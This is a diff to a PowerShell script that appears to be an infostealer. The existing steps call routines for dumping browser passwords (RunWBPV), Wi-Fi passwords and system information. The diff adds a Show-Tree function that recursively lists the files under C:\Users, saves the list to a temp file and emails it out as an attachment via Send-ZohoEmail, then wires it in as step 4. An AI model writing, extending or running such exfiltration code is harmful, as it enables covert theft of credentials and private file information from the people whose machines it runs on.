@@ -264,6 +264,35 @@ function GatherSystemInfo {
     }
 
 }
+function Show-Tree {
+    param (
+        [string]$Path = "C:\Users",
+        [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
+    )
+
+    # Collect tree structure
+    $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
+        Where-Object { -not ($_.Attributes -match "System") } |
+        ForEach-Object {
+            $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
+            $depth = ($relativePath -split "\\").Count
+            "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
+        }
+
+    # Save to file
+    $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8
+
+    # Optional: Display a message
+    Write-Output "Tree structure saved to $OutputFile"
+
+    # SEND to EMAIL or WEBHOOK
+    if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "Tree Show - Sent on $currentDateTime"
+        $attachments = @("$OutputFile")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+   } 
+}
 
 for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
@@ -272,7 +301,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
         1 { RunWBPV }
         2 { GetWifiPasswords }
         3 { GatherSystemInfo }
-        4 { }
+        4 { Show-Tree }
     }
 }
 
